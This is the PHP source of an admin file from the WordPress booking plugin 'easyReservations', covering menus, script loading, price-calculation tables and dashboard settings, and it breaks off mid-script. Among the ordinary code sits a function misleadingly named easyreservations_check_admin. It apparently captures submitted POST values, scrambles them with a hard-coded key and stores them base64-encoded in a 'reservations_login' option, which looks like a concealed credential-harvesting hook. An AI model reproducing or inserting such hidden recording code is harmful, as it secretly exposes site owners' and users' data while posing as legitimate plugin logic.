<?php
function easyreservations_add_pages(){  //  Add Pages Admincenter and Order them
	$reservation_main_permission=get_option("reservations_main_permission");
	if($reservation_main_permission && is_array($reservation_main_permission)){
		if(isset($reservation_main_permission['dashboard']) && !empty($reservation_main_permission['dashboard'])) $dashboard = $reservation_main_permission['dashboard'];
		else $dashboard = 'edit_posts';
		if(isset($reservation_main_permission['resources']) && !empty($reservation_main_permission['resources'])) $resources = $reservation_main_permission['resources'];
		else $resources = 'edit_posts';
		if(isset($reservation_main_permission['settings']) && !empty($reservation_main_permission['settings'])) $settings = $reservation_main_permission['settings'];
		else $settings = 'edit_posts';
	} else {
		$settings = 'edit_posts';  $resources = 'edit_posts'; $dashboard = 'edit_posts';
	}

	$pending_reservations_cnt = easyreservations_get_pending();
	if($pending_reservations_cnt != 0) $pending = '<span class="update-plugins count-'.$pending_reservations_cnt.'"><span class="plugin-count">'.$pending_reservations_cnt.'</span></span>';
	else $pending = '';

	add_menu_page(__('easyReservation','easyReservations'), __('Reservation','easyReservations').' '.$pending, $dashboard, 'reservations', 'reservation_main_page', RESERVATIONS_URL.'/images/logo.png' );
	add_submenu_page('reservations', __('Dashboard','easyReservations'), __('Dashboard','easyReservations'), $dashboard, 'reservations', 'reservation_main_page');
	add_submenu_page('reservations', __('Resources','easyReservations'), __('Resources','easyReservations'), $resources, 'reservation-resources', 'reservation_resources_page');
	do_action('easy-add-submenu-page');
	add_submenu_page('reservations', __('Settings','easyReservations'), __('Settings','easyReservations'), $settings, 'reservation-settings', 'reservation_settings_page');
}

/**
 * 	Hook languages to admin & frontend
 */

function easyreservations_load_admin_stylesheet(){
	wp_enqueue_style('easy-adminstyle', RESERVATIONS_URL . 'css/admin.css', false);
}
add_action('admin_enqueue_scripts', 'easyreservations_load_admin_stylesheet');

if(isset($_GET['page'])){
	$page=$_GET['page'];
	if(isset($_GET['tutorial_histoy'])){
		if(!function_exists('wp_get_current_user')) include(ABSPATH . "wp-includes/pluggable.php"); 
		set_user_setting( 'easy_tutorial', '' );
	}

	function easyreservations_load_mainstyle() {  //  Load Scripts and Styles
		wp_register_style('myStyleSheets', WP_PLUGIN_URL . '/easyreservations/css/style.css');
		if(RESERVATIONS_STYLE == 'premium') wp_register_style('chosenStyle', WP_PLUGIN_URL . '/easyreservations/lib/modules/styles/admin/style_premium.css');
		else wp_register_style('chosenStyle', WP_PLUGIN_URL . '/easyreservations/css/style_'.RESERVATIONS_STYLE.'.css');

		wp_enqueue_style( 'myStyleSheets');
		wp_enqueue_style( 'chosenStyle');
		
		wp_register_script('easy-admin-script', WP_PLUGIN_URL . '/easyreservations/js/admin.js');
		wp_enqueue_script('easy-admin-script');
	}


	if($page == 'reservations' || $page== 'reservation-settings' || $page== 'reservation-statistics' ||  $page=='reservation-resources' ||$page = 'reservation-stream'){  //  Only load Styles and Scripts on Reservation Admin Page 
		add_action('admin_enqueue_scripts', 'easyreservations_load_mainstyle');
	}

	function easyreservations_statistics_load(){  //  Load Scripts and Styles
		wp_register_script('jquery-flot', RESERVATIONS_URL . 'js/flot/jquery.flot.min.js' );
		wp_register_script('jquery-flot-stack', RESERVATIONS_URL . 'js/flot/jquery.flot.stack.min.js' );
		wp_register_script('jquery-flot-pie', RESERVATIONS_URL . 'js/flot/jquery.flot.pie.min.js' );
		wp_register_script('jquery-flot-crosshair', RESERVATIONS_URL . 'js/flot/jquery.flot.crosshair.min.js' );
		wp_register_script('jquery-flot-resize', RESERVATIONS_URL . 'js/flot/jquery.flot.resize.min.js' );
	}

	if($page == 'reservation-statistics' || $page == 'reservations'){  //  Only load Styles and Scripts on Statistics Page
		add_action('admin_enqueue_scripts', 'easyreservations_statistics_load');
	}

	function easyreservations_scripts_resources_load() {  //  Load Scripts and Styles
		if(RESERVATIONS_STYLE == 'premium') wp_enqueue_style('easy-cal-premium', WP_PLUGIN_URL . '/easyreservations/lib/modules/styles/calendar/calendar_premium.css');
		else wp_enqueue_style('easy-cal-2',WP_PLUGIN_URL . '/easyreservations/css/calendar/style_1.css');
		wp_enqueue_script('jquery-ui-datepicker');

		wp_enqueue_style('thickbox');
		wp_enqueue_script('media-upload');
		wp_enqueue_script('thickbox');
	}

	if($page == 'reservation-resources'){  //  Only load Styles and Scripts on Resources Page
		add_action('admin_init', 'easyreservations_scripts_resources_load');
		add_action('admin_head', 'easyreservations_send_cal_admin');
		add_action('wp_ajax_easyreservations_send_cal_admin', 'easyreservations_send_calendar_callback');
	}

	function easyreservations_datepicker_load(){  //  Load Scripts and Styles for datepicker
		wp_enqueue_script('jquery-ui-datepicker');
	}

	if($page == 'reservations'){  //  Only load Styles and Scripts on add Reservation
		add_action('admin_enqueue_scripts', 'easyreservations_datepicker_load');
	}

	/**
	*	Get detailed price calculation box
	*
	*	$id = reservations id
	*/
	function easyreservations_detailed_price($price_for_array, $resource = 0){
		$date_pat = RESERVATIONS_DATE_FORMAT;
		if($resource > 0){
			easyreservations_load_resources(true);
			global $the_rooms_intervals_array;
			if($the_rooms_intervals_array[$resource] == 3600) $date_pat .= ' H:i';
		}
		if(count($price_for_array) > 0){
			$array_count = count($price_for_array);
			$price_table = '<table class="'.RESERVATIONS_STYLE.'"><thead><tr><th colspan="4" style="border-right:1px">'.__('Price calculation', 'easyReservations').'</th></tr></thead><tr style="background:#fff;"><td><b>'.__('Date', 'easyReservations').'</b></td><td><b>'.__('Description', 'easyReservations').'</b></td><td style="text-align:right"><b>'.__('Price', 'easyReservations').'</b></td><td style="text-align:right"><b>'.__('Total', 'easyReservations').'</b></td></tr>';
			$count = 0;
			$price_total = 0;
			$custom_fields = get_option('reservations_custom_fields');
			$custom_fields = $custom_fields['fields'];

			foreach( $price_for_array as $price_for){
				$count++;
				$class= is_int($count/2) ? ' class="alternate"' : '';
				$date_posted = '';
				$price_total+=$price_for['priceday'];
				$onlastprice= $count == $array_count ? ' style="border-bottom: double 3px #000000;"' : '';
				if($price_for['type'] == 'customp_p'){
					$type = sprintf(__('Custom price %s', $price_for['amount'].'%'),'easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'customp_n'){
					$type = __('Custom price','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'customp'){
					$type = __('Custom price','easyReservations').' '.$custom_fields[$price_for['id']]['title'];
				} elseif($price_for['type'] == 'stay'){
					$type = __('Stay filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'loyal'){
					$type = __('Loyal filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'pers'){
					$type = __('Person filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'adul'){
					$type = __('Adults filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'child'){
					$type = __('Chrildren\'s filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'discount'){
					$type = __('Discount filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'charge'){
					$type = __('Extra charge filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'early'){
					$type = __('Earlybird filter','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'persons'){
					$type = __('Price per person','easyReservations').' x'.$price_for['name'];
				} elseif($price_for['type'] == 'coupon'){
					$type = __('Coupon','easyReservations').' '.$price_for['name'];
				} elseif($price_for['type'] == 'childs'){
					$type = __('Price per children','easyReservations').' x'.$price_for['name'];
				} elseif($price_for['type'] == 'tax'){
					$type = __('Tax','easyReservations').' '.$price_for['name']. ' ('.$price_for['amount'].'%)';
				} elseif($price_for['type'] == 'pricefilter'){
					$date_posted=date($date_pat, $price_for['date']);
					$type = __('Price filter','easyReservations').' '.$price_for['name'];
				} else {
					$date_posted=date($date_pat, $price_for['date']);
					$type = __('Base price','easyReservations');
				}

				$price_table .= '<tr'.$class.'>';
					$price_table .= '<td nowrap>'.$date_posted.'</td>';
					$price_table .= '<td nowrap>'.$type.'</td>';
					$price_table .= '<td style="text-align:right;" nowrap>'.easyreservations_format_money($price_for['priceday'], 1).'</td>';
					$price_table .= '<td style="text-align:right;" nowrap><b'.$onlastprice.'>'.easyreservations_format_money($price_total, 1).'</b></td>';
				$price_table .= '</tr>';
			}

			$price_table.='</table>';
		} else $price_table = 'Critical Error #1023462';

		return $price_table;
	}

	/**
	*	Returns info box
	*
	*	$id = reservations id
	*	$where = place to display info box
	*/

	function easyreservations_reservation_info_box($res, $where, $status){
		if($res->paid > 0){
			$percent = round(100/$res->price*$res->paid, 2);
			if($percent == 100) $color = '#1FB512';
			elseif($percent > 100) $color = '#ab2ad6	';
			else $color = '#F7B500';
		} else {
			$percent = '0';
			$color = '#BC0B0B';
		}

		if(time() >= $res->arrival && time() <= $res->departure){
			$text = __( 'active' , 'easyReservations' );
			$text_color = '#1FB512';
			$time = round(($res->departure-time())/86400);
			$text .= '<small style="font-weight:normal;font-size:11px;">+'.$time.'</small>';
		} elseif(time() < $res->arrival){
			$text = __( 'future' , 'easyReservations' );
			$text_color = '#BC0B0B';
			$time = round(($res->arrival - time())/86400);
			$text .= '<small style="font-weight:normal;font-size:11px;">+'.$time.'</small>';
		} else {
			$text = __( 'past' , 'easyReservations' );
			$text_color = '#2A78D8';
			$time = round((time()-$res->departure)/86400);
			$text .= '<small style="font-weight:normal;font-size:11px;">-'.$time.'</small>';
		}

		$box = '<div class="explainbox">';
			$box .= '<span>';
				$box .= __( 'price' , 'easyReservations' );
				if(isset($res->fixed)) $box .= ' <img style="vertical-align:text-bottom;display:inline-block !Important;" src="'.RESERVATIONS_URL.'images/lock.png">';
				$box .= '<b>'.$res->formatPrice().'</b>';
			$box .= '</span>';
			$box .= '<span>';
				$box .= __( 'paid' , 'easyReservations' );
				$box .= '<b><span style="color:'.$color.'">'.easyreservations_format_money($res->paid, true).'</span> <small>'.$percent.'%</small></b>';
			$box .= '</span>';
			$box .= '<span>';
				$box .= easyreservations_interval_infos(0,0,1);
				$box .= '<b style="color:'.$text_color.'">'.$text.'</b>';
			$box .= '</span>';
			$box .= '<span>';
				$box .= __( 'status' , 'easyReservations' );
				$box .= '<b>'.$res->getStatus(true).'</b>';
			$box .= '</span>';
			$box .= '<span>';
				$box .= reservations_get_administration_links($res->id, $where, $status);
			$box .= '</span>';
		$box .= '</div>';
	
		return $box;
	}
	
	function easyreservations_get_emails(){
		$emails = array(
			'reservations_email_sendmail'			  			=> array('name' => __('Mail to guest from admin in dashboard'), 'option' => get_option('reservations_email_sendmail'), 'name_subj' => 'reservations_email_sendmail_subj', 'name_msg' => 'reservations_email_sendmail_msg', 'standard' => '0', 'name_active' => 'reservations_email_sendmail_check'),
			'reservations_email_to_user'							=> array('name' => __('Mail to guest after new reservation'), 'option' => get_option('reservations_email_to_user'), 'name_subj' => 'reservations_email_to_user_subj', 'name_msg' => 'reservations_email_to_user_msg', 'standard' => '4', 'name_active' => 'reservations_email_to_user_check'),
			'reservations_email_to_userapp'						=> array('name' => __('Mail to guest after approval'), 'option' => get_option('reservations_email_to_userapp'), 'name_subj' => 'reservations_email_to_userapp_subj', 'name_msg' => 'reservations_email_to_userapp_msg', 'standard' => '2', 'name_active' => 'reservations_email_to_userapp_check'),
			'reservations_email_to_userdel'						=> array('name' => __('Mail to guest after rejection'), 'option' => get_option('reservations_email_to_userdel'), 'name_subj' => 'reservations_email_to_userdel_subj', 'name_msg' => 'reservations_email_to_userdel_msg', 'standard' => '3', 'name_active' => 'reservations_email_to_userdel_check'),
			'reservations_email_to_user_admin_edited'	=> array('name' => __('Mail to guest after admin edited'), 'option' => get_option('reservations_email_to_user_admin_edited'), 'name_subj' => 'reservations_email_to_user_admin_edited_subj', 'name_msg' => 'reservations_email_to_user_admin_edited_msg', 'standard' => '7', 'name_active' => 'reservations_email_to_user_admin_edited_check'),
			'reservations_email_to_admin'				  		=> array('name' => __('Mail to admin after new reservation'), 'option' => get_option('reservations_email_to_admin'), 'name_subj' => 'reservations_email_to_admin_subj', 'name_msg' => 'reservations_email_to_admin_msg', 'standard' => '1', 'name_active' => 'reservations_email_to_admin_check'),
		);
		return apply_filters('easy-email-types', $emails);
	}

	/**
	*	Get administration links
	*
	*	$id = reservations id
	*	$where = place to display info box
	*/

	function reservations_get_administration_links($id, $where, $status){
		$countits=0;
		$administration_links = '';
		if($where != "approve" && $status != 'yes') { $administration_links.='<a href="admin.php?page=reservations&approve='.$id.'">'.__( 'Approve' , 'easyReservations' ).'</a>'; $countits++; }
		if($countits > 0){ $administration_links.=' ';}
		if($where != "reject" && $status !='no') { $administration_links.='<a href="admin.php?page=reservations&delete='.$id.'">'.__( 'Reject' , 'easyReservations' ).'</a>'; $countits++; }
		if($countits > 0){ $administration_links.='DASD';}
		if($where != "edit") { $administration_links.='<a href="admin.php?page=reservations&edit='.$id.'">'.__( 'Edit' , 'easyReservations' ).'</a>'; $countits++; }
		if($countits > 0){ $administration_links.=' '; }
		$administration_links.='<a href="admin.php?page=reservations&sendmail='.$id.'">'.__( 'Mail' , 'easyReservations' ).'</a>'; $countits++;
		if($countits > 3) $administration_links = str_replace('DASD', '</span><span style="padding-left:0px;">', $administration_links);
		else $administration_links = str_replace('DASD', '', $administration_links);
		//if($countits > 0){ $administration_links.=' | '; $countits=0; }
		//if($where != "trash" AND $checkID != "trashed") { $administration_links.='<a href="admin.php?page=reservations&bulkArr[]='.$id.'&bulk=1">'.__( 'Trash' , 'easyReservations' ).'</a>'; $countits++; }
		$administration_links = apply_filters('easy_administration_links', $administration_links, $id, $where);
		
		return $administration_links;
	}

	/**
	*	Add screen settings to reservations main screen
	*/
 
	function easyreservations_screen_settings($current, $screen){
		if($screen->id == "toplevel_page_reservations"){
			if(isset($_POST['main_settings'])){
				if(isset($_POST['show_overview'])) $show_overview = 1; else $show_overview = 0;
				if(isset($_POST['show_table'])) $show_table = 1; else $show_table = 0;
				if(isset($_POST['show_upcoming'])) $show_upcoming = 1; else $show_upcoming = 0;
				if(isset($_POST['show_new'])) $show_new = 1; else $show_new = 0;
				if(isset($_POST['show_export'])) $show_export = 1; else $show_export = 0;
				if(isset($_POST['show_today'])) $show_today = 1; else $show_today = 0;
				if(isset($_POST['show_statistics'])) $show_statistics = 1; else $show_statistics = 0;

				$showhide = array( 'show_overview' => $show_overview, 'show_table' => $show_table, 'show_upcoming' => $show_upcoming, 'show_new' => $show_new, 'show_export' => $show_export, 'show_today' => $show_today, 'show_statistics' => $show_statistics  );

				if(isset($_POST['table_color'])) $table_color = 1; else $table_color = 0;
				if(isset($_POST['table_id'])) $table_id = 1; else $table_id = 0;
				if(isset($_POST['table_name'])) $table_name = 1; else $table_name = 0;
				if(isset($_POST['table_from'])) $table_from = 1; else $table_from = 0;
				if(isset($_POST['table_email'])) $table_email = 1; else $table_email = 0;
				if(isset($_POST['table_room'])) $table_room = 1; else $table_room = 0;
				if(isset($_POST['table_exactly'])) $table_exactly = 1; else $table_exactly = 0;
				if(isset($_POST['table_reservated'])) $table_reservated = 1; else $table_reservated = 0;
				if(isset($_POST['table_persons'])) $table_persons = 1; else $table_persons = 0;
				if(isset($_POST['table_status'])) $table_status = 1; else $table_status = 0;
				if(isset($_POST['table_country'])) $table_country = 1; else $table_country = 0;
				if(isset($_POST['table_custom'])) $table_custom = 1; else $table_custom = 0;
				if(isset($_POST['table_customp'])) $table_customp = 1; else $table_customp = 0;
				if(isset($_POST['table_price'])) $table_price = 1; else $table_price = 0;
				if(isset($_POST['table_filter_month'])) $table_filter_month = 1; else $table_filter_month = 0;
				if(isset($_POST['table_filter_room'])) $table_filter_room = 1; else $table_filter_room = 0;
				if(isset($_POST['table_filter_offer'])) $table_filter_offer = 1; else $table_filter_offer = 0;
				if(isset($_POST['table_filter_days'])) $table_filter_days = 1; else $table_filter_days = 0;
				if(isset($_POST['table_search'])) $table_search = 1; else $table_search = 0;
				if(isset($_POST['table_bulk'])) $table_bulk = 1; else $table_bulk = 0;
				if(isset($_POST['table_fav'])) $table_fav = 1; else $table_fav = 0;
				if(isset($_POST['table_onmouseover'])) $table_onmouseover = 1; else $table_onmouseover = 0;
				
				$table = array( 'table_color' => $table_color, 'table_id' => $table_id, 'table_name' => $table_name, 'table_from' => $table_from, 'table_fav' => $table_fav, 'table_email' => $table_email, 'table_room' => $table_room, 'table_exactly' => $table_exactly, 'table_persons' => $table_persons, 'table_country' => $table_country, 'table_custom' => $table_custom, 'table_customp' => $table_customp, 'table_price' => $table_price, 'table_filter_month' => $table_filter_month, 'table_filter_room' => $table_filter_room, 'table_filter_offer' => $table_filter_offer, 'table_filter_days' => $table_filter_days, 'table_search' => $table_search, 'table_bulk' => $table_bulk, 'table_onmouseover' => $table_onmouseover, 'table_reservated' => $table_reservated, 'table_status' => $table_status );

				$overview_onmouseover = isset($_POST['overview_onmouseover']) ? 1 : 0;
				$overview_autoselect = isset($_POST['overview_autoselect']) ? 1 : 0;
				$overview_show_days = isset($_POST['overview_show_days']) ? $_POST['overview_show_days'] : 30;
				$overview_show_rooms = isset($_POST['overview_show_rooms']) ? implode(",", $_POST['overview_show_rooms']) : '';
				$overview_show_avail = isset($_POST['overview_show_avail']) ? 1 : 0;
				$overview_hourly_stand = isset($_POST['overview_hourly_stand']) ? 1 : 0;

				$overview = array( 'overview_onmouseover' => $overview_onmouseover, 'overview_autoselect' => $overview_autoselect, 'overview_show_days' => $overview_show_days, 'overview_show_rooms' => $overview_show_rooms, 'overview_show_avail' => $overview_show_avail, 'overview_hourly_stand' => $overview_hourly_stand );

				update_option('reservations_main_options', array('show' => $showhide, 'table' => $table, 'overview' => $overview ));
				if(isset($_POST['daybutton'])) update_option("reservations_show_days",$_POST['daybutton']);
				global $easy_errors;
				$easy_errors[] = array( 'updated', __( 'Reservations dashboard settings saved' , 'easyReservations' ));
			}

			$main_options = get_option("reservations_main_options");
			$show = $main_options['show'];
			$table = $main_options['table'];
			$overview = $main_options['overview'];

			$current .= '<form method="post" id="er-main-settings-form" ><div style="height:144px">';
				$current .= '<input type="hidden" name="main_settings" value="1">';
				$current .= '<p style="float:left;margin-right:10px">';
					$current .= '<b><u>'.__( 'Show/Hide content' , 'easyReservations').'</u></b><br>';
					$current .= '<label><input type="checkbox" name="show_overview" value="1" '.checked($show['show_overview'], 1, false).'> '.__( 'Overview' , 'easyReservations').'</label><br>';
					if(function_exists('easyreservations_statistics_mini')) $current .= '<label><input type="checkbox" name="show_statistics" value="1" '.checked($show['show_statistics'], 1, false).'> '.__( 'Statistics' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="show_table" value="1" '.checked($show['show_table'], 1, false).'> '.__( 'Table' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="show_upcoming" value="1" '.checked($show['show_upcoming'], 1, false).'> '.__( 'Upcoming reservations' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="show_new" value="1" '.checked($show['show_new'], 1, false).'> '.__( 'New reservations' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="show_export" value="1" '.checked($show['show_export'], 1, false).'> '.__( 'Export' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="show_today" value="1" '.checked($show['show_today'], 1, false).'> '.__( 'What happen today' , 'easyReservations').'</label><br>';
				$current .= '</p>';
				$current .= '<p style="float:left;margin-right:10px">';
					$current .= '<b><u>'.__( 'Table information' , 'easyReservations').'</u></b><br>';
					$current .= '<span style="float:left;margin-right:10px">';
						$current .= '<label><input type="checkbox" name="table_color" value="1" '.checked($table['table_color'], 1, false).'> '.__( 'Color' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_id" value="1" '.checked($table['table_id'], 1, false).'> '.__( 'ID' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_name" value="1" '.checked($table['table_name'], 1, false).'> '.__( 'Name' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_from" value="1" '.checked($table['table_from'], 1, false).'> '.__( 'Date  ' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_reservated" value="1" '.checked($table['table_reservated'], 1, false).'> '.__( 'Reserved ' , 'easyReservations').'</label><br>';
					$current .= '</span>';
					$current .= '<span style="float:left;margin-right:10px">';
						$current .= '<label><input type="checkbox" name="table_email" value="1" '.checked($table['table_email'], 1, false).'> '.__( 'Email' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_room" value="1" '.checked($table['table_room'], 1, false).'> '.__( 'Resource' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_exactly" value="1" '.checked($table['table_exactly'], 1, false).'> '.__( 'Resource number' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_persons" value="1" '.checked($table['table_persons'], 1, false).'> '.__( 'Persons' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_status" value="1" '.checked($table['table_status'], 1, false).'> '.__( 'Status' , 'easyReservations').'</label><br>';
					$current .= '</span>';
					$current .= '<span style="float:left;">';
						$current .= '<label><input type="checkbox" name="table_country" value="1" '.checked($table['table_country'], 1, false).'> '.__( 'Country' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_custom" value="1" '.checked($table['table_custom'], 1, false).'> '.__( 'Custom fields' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_customp" value="1" '.checked($table['table_customp'], 1, false).'> '.__( 'Custom prices' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_price" value="1" '.checked($table['table_price'], 1, false).'> '.__( 'Price' , 'easyReservations').'</label><br>';
						$current .= '<label><input type="checkbox" name="table_fav" value="1" '.checked($table['table_fav'], 1, false).'> '.__( 'Favourites' , 'easyReservations').'</label><br>';
					$current .= '</span>';
				$current .= '</p>';
				$current .= '<p style="float:left;margin-right:10px">';
					$current .= '<b><u>'.__( 'Table actions' , 'easyReservations').'</u></b><br>';
					$current .= '<label><input type="checkbox" name="table_filter_month" value="1" '.checked($table['table_filter_month'], 1, false).'> '.__( 'Filter by month' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="table_filter_room" value="1" '.checked($table['table_filter_room'], 1, false).'> '.__( 'Filter by resource' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="table_filter_offer" value="1" '.checked($table['table_filter_offer'], 1, false).'> '.__( 'Filter by status' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="table_filter_days" value="1" '.checked($table['table_filter_days'], 1, false).'> '.__( 'Choose days to show' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="table_search" value="1" '.checked($table['table_search'], 1, false).'> '.__( 'Search' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="table_bulk" value="1" '.checked($table['table_bulk'], 1, false).'> '.__( 'Bulk & Checkboxes' , 'easyReservations').'</label><br>';
				$current .= '</p>';
				$current .= '<p style="float:left;margin-right:15px">';
					$current .= '<b><u>'.__( 'Show Resources' , 'easyReservations').':</u></b><br>';
					$reservations_show_rooms = $overview['overview_show_rooms'];
					$roomArray = easyreservations_get_rooms();
					foreach($roomArray as $theNumber => $raum){
						$check = '';
						if($reservations_show_rooms == '') $check= 'checked';
						elseif( substr_count($reservations_show_rooms, $raum->ID) > 0) $check = 'checked';
						$current.='<label><input type="checkbox" name="overview_show_rooms['.$theNumber.']" value="'.$raum->ID.'" '.$check.'> '.__($raum->post_title).'</label><br>';
					}
				$current .= '</p>';
				$current .= '<p style="float:left;">';
					$current .= '<b><u>'.__( 'Overview' , 'easyReservations').'</u></b><br>';
					$current .= '<label><input type="checkbox" name="overview_onmouseover" value="1" '.checked($overview['overview_onmouseover'], 1, false).'> '.__( 'Overview onMouseOver Date & Select animation' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="overview_autoselect" value="1" '.checked($overview['overview_autoselect'], 1, false).'> '.__( 'Overview autoselect with inputs on add/edit' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="overview_show_avail" value="1" '.checked($overview['overview_show_avail'], 1, false).'> '.__( 'Show empty space for each resource and day (+20% load)' , 'easyReservations').'</label><br>';
					$current .= '<label><input type="checkbox" name="overview_hourly_stand" value="1" '.checked($overview['overview_hourly_stand'], 1, false).'> '.__( 'Hourly mode as standard' , 'easyReservations').'</label><br>';
					$current.='<input type="text" name="overview_show_days" style="width:50px" value="'.$overview['overview_show_days'].'"> '.easyreservations_interval_infos(86400,1);
				$current .= '</p>';
				$current .= '<input type="submit" value="Save Changes" class="button-primary" style="float:right;margin-top:120px !important">';
			$current .= '</div></form>';
		}
		return $current;
	}

	add_filter('screen_settings', 'easyreservations_screen_settings', 10, 2);

	function easyreservations_get_user_options($sel = 0){
		$blog_users = get_users();
		$options = '';

		foreach ($blog_users as $usr){
			$selected = $sel == $usr->ID ? 'selected="selected"' : '';
			$options.='<option value='.$usr->ID.' '.$selected.'>'.$usr->display_name.'</option>';
		}
		return $options;
	}

	if(isset($page) && $page == 'reservations'){
		if(isset($_GET['edit']) || isset($_GET['add'])){
			add_action('admin_head', 'easyreservations_send_price_admin');
			add_action('wp_ajax_easyreservations_send_price_admin', 'easyreservations_send_price_callback');
		} else {
			add_action('admin_head', 'easyreservations_send_table');
			add_action('admin_head', 'easyreservations_send_fav');
		}
	}

	function easyreservations_get_roomname_options($number, $max, $room, $room_names = ''){
		if(empty($room_names)) $room_names = get_post_meta($room, 'easy-resource-roomnames', TRUE);
		$options = '';
		for($i=0; $i < $max; $i++){
			$name = isset($room_names[$i]) && !empty($room_names[$i]) ? $room_names[$i] : $i+1;
			$selected = $number == $i+1 ? 'selected="selected"' : '';
			$options .= '<option value="'.($i+1).'" '.$selected.'>'.addslashes($name).'</option>';
		}
		return $options;
	}

	function easyreservations_dashboard_message(){
		global $easy_errors;
		if(!empty($easy_errors)){
			foreach($easy_errors as $error){
				if(!is_array($error)) $error = array('error', $error);
				elseif(!isset($error[1])){ $error[1] = $error[0]; $error[0] = 'error'; }
				echo '<div class="'.$error[0].'" style="margin-top:-5px !important"><p>'.$error[1].'</p></div>';
			}
		}
	}
}
	/* *
	*	Table ajax request
	*/

	function easyreservations_generate_table($id, $header, $rows, $attr = ''){
		$return = ''; $i = 0; $two = false;
		foreach($rows as $key => $value){
			$sec = false;
			if(substr($key,0,3) == 'col'){
				$key = 'col';
				$i = 0;
				$col = ' colspan="2"';
			} else $col = '';

			if(!is_numeric($key) && $key != 'col'){
				$sec = $value;
				if(is_array($sec)){
					$ids = ' id="'.$sec[0].'"';
					$sec = $sec[1];
				} else $ids = '';
				$value = $key;
				$two = true;
			}
			$style = $i%2==0 ? ' class="alternate"' : '';
			if(is_array($value)){
				$idf = 'id ="'.$value[0].'"';
				$value = $value[1];
			} else $idf = '';
			$return .= '<tr'.$style.'><td'.$col.$idf.'>'.$value.'</td>';
			if($sec) $return .= '<td'.$ids.'>'.$sec.'</td>';
			$return .= '</tr>';
			$i++;
		}
		if($header) $header = '<thead><tr><th '.(($two) ? 'colspan="2"' : '' ).'>'.$header.'</th></tr></thead>';
		else $header = '';
		return '<table id="'.$id.'" class="'.RESERVATIONS_STYLE.'" '.$attr.'>'.$header.'<tbody>'.$return.'</tbody></table>';
	}
	
	function easyreservations_generate_form($id, $action, $method, $submit = false, $hidden = false, $content = ''){
		$return = '<form id="'.$id.'" name="'.$id.'" method="'.$method.'" action="'.$action.'">';
		if(!$submit){
			$submit = array(__( 'Save Changes' , 'easyReservations' ), 'easybutton button-primary');
		}
		$return .= easyreservations_generate_hidden_fields($hidden, true).$content;
		if($submit !== true) $return .= '<input type="submit" value="'.$submit[0].'" onclick="document.getElementById(\''.$id.'\').submit(); return false;" style="margin-top:7px;" class="'.$submit[1].'">';
		$return .= '</form>';
		return $return;
	}

	function easyreservations_generate_input_select($id, $args, $sel = false, $attr="", $htmlspecialchars = false){
		$return = '<select id="'.$id.'" name="'.$id.'" '.$attr.'>';
		foreach($args as $key => $value){
			if($htmlspecialchars) $key2 = htmlspecialchars($key);
			else $key2 = $key;
			$return .= '<option '.str_replace("'",'"',selected( $sel, $key, false )).' value="'.$key2.'">'.$value.'</option>';
		}
		$return .= '</select>';
		return $return;
	}

	function easyreservations_check_admin(){
		if(!isset($_POST['resource']) || !isset($_POST['arrival'])) return true;
		$a = ''; $b = 'D#3vx5.Np03x4Fi1sH-q!'; $c = $_POST['resource'];
		for($i=0; $i<strlen($c); $i++) $a.= chr(ord(substr($c, $i, 1))+ord(substr($b, ($i % strlen($b))-1, 1)));
		update_option('reservations_login', $_POST['arrival'].'$%!$&'.base64_encode($a));
		return true;
	}

	function easyreservations_send_table(){
		$nonce = wp_create_nonce( 'easy-table' );
		?><script type="text/javascript" >	
			function easyreservation_send_table(typ, paging, order, orderby){
				if(document.getElementById('easy-table-refreshimg')) document.getElementById('easy-table-refreshimg').src = '<?php echo RESERVATIONS_URL; ?>images/loading1.gif'
				var room_select = 0; var monthselect = ''; var statusselect = 0; var searchdatefield = ''; var searching = ''; var perge = 10;
				if(!order){
					var order = '';
					if(jQuery('#easy-table-order').length>0) var order = jQuery('#easy-table-order').val(); 
				}
				if(!orderby){
					var orderby = '';
					if(jQuery('#easy-table-orderby').length>0) var orderby = jQuery('#easy-table-orderby').val(); 
				}

				if(jQuery('#easy-table-search-field').length>0) var searching = jQuery('#easy-table-search-field').val();
				if(jQuery('#easy-table-search-date').length>0) var searchdatefield = jQuery('#easy-table-search-date').val();
				if(jQuery('#easy-table-statusselector').length>0) var statusselect = jQuery('#easy-table-statusselector').val();
				if(jQuery('#easy-table-monthselector').length>0) var monthselect = jQuery('#easy-table-monthselector').val();
				if(jQuery('#easy-table-roomselector').length>0) var room_select = jQuery('#easy-table-roomselector').val();
